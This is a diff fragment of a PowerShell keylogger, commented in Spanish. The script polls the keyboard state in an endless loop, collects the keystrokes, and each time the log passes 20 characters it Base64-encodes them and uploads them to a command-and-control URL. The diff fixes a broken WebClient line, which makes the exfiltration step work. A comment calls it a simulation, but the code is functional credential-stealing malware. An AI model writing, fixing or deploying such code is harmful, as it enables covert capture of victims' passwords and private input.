@@ -13,6 +13,7 @@ while($true) {
     Start-Sleep -Milliseconds 100
     for ($ascii = 8; $ascii -le 254; $ascii++) {
         $state = $API::GetAsyncKeyState($ascii)
+        
         if ($state -eq -32767) {
             $log += [char]$ascii
         }
@@ -20,8 +21,7 @@ while($true) {
     # Envío al C2 cada vez que el log llega a 20 caracteres (Simulación dinámica)
     if ($log.Length -gt 20) {
         $body = @{sync_token = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($log))}
-        $client = New-Object
-        System.Net.WebClient
+        $client = New-Object System.Net.WebClient
         $client.UploadString($C2_URL, $body)
         $log = ""
     }
